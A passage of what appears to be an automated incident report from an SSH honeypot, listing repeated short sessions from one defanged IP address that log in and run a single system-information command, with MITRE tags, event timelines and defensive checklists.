| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:29` | `cowrie.session.connect` |
| `2026-08-13 06:55:30` | `cowrie.client.version` |
| `2026-08-13 06:55:30` | `cowrie.client.kex` |
| `2026-08-13 06:55:30` | `cowrie.login.success` |
| `2026-08-13 06:55:32` | `cowrie.session.params` |
| `2026-08-13 06:55:32` | `cowrie.command.input` |
| `2026-08-13 06:55:32` | `cowrie.log.closed` |
| `2026-08-13 06:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fba77202d4a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:36` | `cowrie.session.connect` |
| `2026-08-13 06:55:36` | `cowrie.client.version` |
| `2026-08-13 06:55:36` | `cowrie.client.kex` |
| `2026-08-13 06:55:36` | `cowrie.login.success` |
| `2026-08-13 06:55:37` | `cowrie.session.params` |
| `2026-08-13 06:55:37` | `cowrie.command.input` |
| `2026-08-13 06:55:37` | `cowrie.log.closed` |
| `2026-08-13 06:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e183c90cdf0c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:42` | `cowrie.session.connect` |
| `2026-08-13 06:55:42` | `cowrie.client.version` |
| `2026-08-13 06:55:42` | `cowrie.client.kex` |
| `2026-08-13 06:55:42` | `cowrie.login.success` |
| `2026-08-13 06:55:43` | `cowrie.session.params` |
| `2026-08-13 06:55:43` | `cowrie.command.input` |
| `2026-08-13 06:55:44` | `cowrie.log.closed` |
| `2026-08-13 06:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb1417a4ad7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:48` | `cowrie.session.connect` |
| `2026-08-13 06:55:48` | `cowrie.client.version` |
| `2026-08-13 06:55:48` | `cowrie.client.kex` |
| `2026-08-13 06:55:49` | `cowrie.login.success` |
| `2026-08-13 06:55:50` | `cowrie.session.params` |
| `2026-08-13 06:55:50` | `cowrie.command.input` |
| `2026-08-13 06:55:51` | `cowrie.log.closed` |
| `2026-08-13 06:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b58d4b08070e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:55 |
| **Last Seen** | 2026-08-13 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:55:55` | `cowrie.session.connect` |
| `2026-08-13 06:55:55` | `cowrie.client.version` |
| `2026-08-13 06:55:55` | `cowrie.client.kex` |
| `2026-08-13 06:55:56` | `cowrie.login.success` |
| `2026-08-13 06:55:57` | `cowrie.session.params` |
| `2026-08-13 06:55:57` | `cowrie.command.input` |
| `2026-08-13 06:55:58` | `cowrie.log.closed` |
| `2026-08-13 06:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f36bdcfedc0d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:01` | `cowrie.session.connect` |
| `2026-08-13 06:56:01` | `cowrie.client.version` |
| `2026-08-13 06:56:01` | `cowrie.client.kex` |
| `2026-08-13 06:56:03` | `cowrie.login.success` |
| `2026-08-13 06:56:04` | `cowrie.session.params` |
| `2026-08-13 06:56:04` | `cowrie.command.input` |
| `2026-08-13 06:56:05` | `cowrie.log.closed` |
| `2026-08-13 06:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-717c9d54ca72

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:07` | `cowrie.session.connect` |
| `2026-08-13 06:56:08` | `cowrie.client.version` |
| `2026-08-13 06:56:08` | `cowrie.client.kex` |
| `2026-08-13 06:56:09` | `cowrie.login.success` |
| `2026-08-13 06:56:10` | `cowrie.session.params` |
| `2026-08-13 06:56:10` | `cowrie.command.input` |
| `2026-08-13 06:56:10` | `cowrie.log.closed` |
| `2026-08-13 06:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a9a4b25a4a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:14` | `cowrie.session.connect` |
| `2026-08-13 06:56:14` | `cowrie.client.version` |
| `2026-08-13 06:56:14` | `cowrie.client.kex` |
| `2026-08-13 06:56:15` | `cowrie.login.success` |
| `2026-08-13 06:56:16` | `cowrie.session.params` |
| `2026-08-13 06:56:16` | `cowrie.command.input` |
| `2026-08-13 06:56:16` | `cowrie.log.closed` |
| `2026-08-13 06:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11905bbc8570

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:20` | `cowrie.session.connect` |
| `2026-08-13 06:56:20` | `cowrie.client.version` |
| `2026-08-13 06:56:20` | `cowrie.client.kex` |
| `2026-08-13 06:56:22` | `cowrie.login.success` |
| `2026-08-13 06:56:24` | `cowrie.session.params` |
| `2026-08-13 06:56:24` | `cowrie.command.input` |
| `2026-08-13 06:56:24` | `cowrie.log.closed` |
| `2026-08-13 06:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a224b93fdf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:27` | `cowrie.session.connect` |
| `2026-08-13 06:56:27` | `cowrie.client.version` |
| `2026-08-13 06:56:27` | `cowrie.client.kex` |
| `2026-08-13 06:56:27` | `cowrie.login.success` |
| `2026-08-13 06:56:28` | `cowrie.session.params` |
| `2026-08-13 06:56:28` | `cowrie.command.input` |
| `2026-08-13 06:56:28` | `cowrie.log.closed` |
| `2026-08-13 06:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795655baf3b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:33` | `cowrie.session.connect` |
| `2026-08-13 06:56:33` | `cowrie.client.version` |
| `2026-08-13 06:56:33` | `cowrie.client.kex` |
| `2026-08-13 06:56:36` | `cowrie.login.success` |
| `2026-08-13 06:56:37` | `cowrie.session.params` |
| `2026-08-13 06:56:37` | `cowrie.command.input` |
| `2026-08-13 06:56:37` | `cowrie.log.closed` |
| `2026-08-13 06:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d9a0e8636e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:40` | `cowrie.session.connect` |
| `2026-08-13 06:56:40` | `cowrie.client.version` |
| `2026-08-13 06:56:40` | `cowrie.client.kex` |
| `2026-08-13 06:56:41` | `cowrie.login.success` |
| `2026-08-13 06:56:43` | `cowrie.session.params` |
| `2026-08-13 06:56:43` | `cowrie.command.input` |
| `2026-08-13 06:56:43` | `cowrie.log.closed` |
| `2026-08-13 06:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ea757deb46

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:46` | `cowrie.session.connect` |
| `2026-08-13 06:56:46` | `cowrie.client.version` |
| `2026-08-13 06:56:46` | `cowrie.client.kex` |
| `2026-08-13 06:56:48` | `cowrie.login.success` |
| `2026-08-13 06:56:50` | `cowrie.session.params` |
| `2026-08-13 06:56:50` | `cowrie.command.input` |
| `2026-08-13 06:56:50` | `cowrie.log.closed` |
| `2026-08-13 06:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26d1ff4b1d5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:53` | `cowrie.session.connect` |
| `2026-08-13 06:56:53` | `cowrie.client.version` |
| `2026-08-13 06:56:53` | `cowrie.client.kex` |
| `2026-08-13 06:56:56` | `cowrie.login.success` |
| `2026-08-13 06:56:57` | `cowrie.session.params` |
| `2026-08-13 06:56:57` | `cowrie.command.input` |
| `2026-08-13 06:56:58` | `cowrie.log.closed` |
| `2026-08-13 06:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f447d828634

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:56 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:56:59` | `cowrie.session.connect` |
| `2026-08-13 06:56:59` | `cowrie.client.version` |
| `2026-08-13 06:56:59` | `cowrie.client.kex` |
| `2026-08-13 06:57:01` | `cowrie.login.success` |
| `2026-08-13 06:57:02` | `cowrie.session.params` |
| `2026-08-13 06:57:02` | `cowrie.command.input` |
| `2026-08-13 06:57:02` | `cowrie.log.closed` |
| `2026-08-13 06:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bfb4bbf80dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:06` | `cowrie.session.connect` |
| `2026-08-13 06:57:06` | `cowrie.client.version` |
| `2026-08-13 06:57:06` | `cowrie.client.kex` |
| `2026-08-13 06:57:07` | `cowrie.login.success` |
| `2026-08-13 06:57:08` | `cowrie.session.params` |
| `2026-08-13 06:57:08` | `cowrie.command.input` |
| `2026-08-13 06:57:09` | `cowrie.log.closed` |
| `2026-08-13 06:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c2479782e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:12` | `cowrie.session.connect` |
| `2026-08-13 06:57:12` | `cowrie.client.version` |
| `2026-08-13 06:57:12` | `cowrie.client.kex` |
| `2026-08-13 06:57:14` | `cowrie.login.success` |
| `2026-08-13 06:57:16` | `cowrie.session.params` |
| `2026-08-13 06:57:16` | `cowrie.command.input` |
| `2026-08-13 06:57:16` | `cowrie.log.closed` |
| `2026-08-13 06:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba992f058843

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:18` | `cowrie.session.connect` |
| `2026-08-13 06:57:18` | `cowrie.client.version` |
| `2026-08-13 06:57:18` | `cowrie.client.kex` |
| `2026-08-13 06:57:20` | `cowrie.login.success` |
| `2026-08-13 06:57:21` | `cowrie.session.params` |
| `2026-08-13 06:57:21` | `cowrie.command.input` |
| `2026-08-13 06:57:22` | `cowrie.log.closed` |
| `2026-08-13 06:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec637a96e62f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:26` | `cowrie.session.connect` |
| `2026-08-13 06:57:26` | `cowrie.client.version` |
| `2026-08-13 06:57:26` | `cowrie.client.kex` |
| `2026-08-13 06:57:27` | `cowrie.login.success` |
| `2026-08-13 06:57:28` | `cowrie.session.params` |
| `2026-08-13 06:57:28` | `cowrie.command.input` |
| `2026-08-13 06:57:28` | `cowrie.log.closed` |
| `2026-08-13 06:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4248a9f87ca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:33` | `cowrie.session.connect` |
| `2026-08-13 06:57:33` | `cowrie.client.version` |
| `2026-08-13 06:57:33` | `cowrie.client.kex` |
| `2026-08-13 06:57:34` | `cowrie.login.success` |
| `2026-08-13 06:57:35` | `cowrie.session.params` |
| `2026-08-13 06:57:35` | `cowrie.command.input` |
| `2026-08-13 06:57:35` | `cowrie.log.closed` |
| `2026-08-13 06:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb00a8f3f7d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:39` | `cowrie.session.connect` |
| `2026-08-13 06:57:39` | `cowrie.client.version` |
| `2026-08-13 06:57:39` | `cowrie.client.kex` |
| `2026-08-13 06:57:40` | `cowrie.login.success` |
| `2026-08-13 06:57:41` | `cowrie.session.params` |
| `2026-08-13 06:57:41` | `cowrie.command.input` |
| `2026-08-13 06:57:41` | `cowrie.log.closed` |
| `2026-08-13 06:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251381e2f2f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:46` | `cowrie.session.connect` |
| `2026-08-13 06:57:46` | `cowrie.client.version` |
| `2026-08-13 06:57:46` | `cowrie.client.kex` |
| `2026-08-13 06:57:46` | `cowrie.login.success` |
| `2026-08-13 06:57:48` | `cowrie.session.params` |
| `2026-08-13 06:57:48` | `cowrie.command.input` |
| `2026-08-13 06:57:48` | `cowrie.log.closed` |
| `2026-08-13 06:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-782dfeb89c00

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:53` | `cowrie.session.connect` |
| `2026-08-13 06:57:53` | `cowrie.client.version` |
| `2026-08-13 06:57:53` | `cowrie.client.kex` |
| `2026-08-13 06:57:53` | `cowrie.login.success` |
| `2026-08-13 06:57:54` | `cowrie.session.params` |
| `2026-08-13 06:57:54` | `cowrie.command.input` |
| `2026-08-13 06:57:54` | `cowrie.log.closed` |
| `2026-08-13 06:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87b237992241

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:57 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:57:59` | `cowrie.session.connect` |
| `2026-08-13 06:57:59` | `cowrie.client.version` |
| `2026-08-13 06:58:00` | `cowrie.client.kex` |
| `2026-08-13 06:58:00` | `cowrie.login.success` |
| `2026-08-13 06:58:01` | `cowrie.session.params` |
| `2026-08-13 06:58:01` | `cowrie.command.input` |
| `2026-08-13 06:58:01` | `cowrie.log.closed` |
| `2026-08-13 06:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fef940c152f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:06` | `cowrie.session.connect` |
| `2026-08-13 06:58:06` | `cowrie.client.version` |
| `2026-08-13 06:58:06` | `cowrie.client.kex` |
| `2026-08-13 06:58:07` | `cowrie.login.success` |
| `2026-08-13 06:58:08` | `cowrie.session.params` |
| `2026-08-13 06:58:08` | `cowrie.command.input` |
| `2026-08-13 06:58:08` | `cowrie.log.closed` |
| `2026-08-13 06:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51e6ff50929c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:12` | `cowrie.session.connect` |
| `2026-08-13 06:58:12` | `cowrie.client.version` |
| `2026-08-13 06:58:12` | `cowrie.client.kex` |
| `2026-08-13 06:58:12` | `cowrie.login.success` |
| `2026-08-13 06:58:13` | `cowrie.session.params` |
| `2026-08-13 06:58:13` | `cowrie.command.input` |
